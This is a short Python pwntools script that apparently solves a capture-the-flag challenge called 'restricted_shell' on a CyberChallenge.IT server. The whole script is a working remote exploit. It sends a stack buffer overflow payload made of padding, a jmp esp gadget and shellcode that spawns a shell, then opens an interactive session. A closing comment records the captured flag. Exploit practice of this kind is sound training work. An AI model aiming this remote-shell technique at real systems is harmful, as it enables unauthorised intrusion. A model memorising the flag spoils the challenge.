from pwn import *

exe = ELF('restricted_shell')
context.binary = exe
HOST = "rshell.challs.cyberchallenge.it"
PORT = 6003
p = remote(HOST, PORT)

jmp_esp = 0x8048593  # address of the start of the stack
shell_code = shellcraft.sh()  # Crafting shellcode

# crafting the full payload
payload = (
        b'a' * 44 +
        p32(jmp_esp) +
        asm(shell_code)
)

p.sendlineafter(b'c:\ >', payload)  # send the payload to the server
p.recvuntil('install')
p.recvuntil('\n\n')
p.interactive()

# FLAG --> CCIT{You f0unD Ur fir5T G4dge7. ROP is w41t1n9}
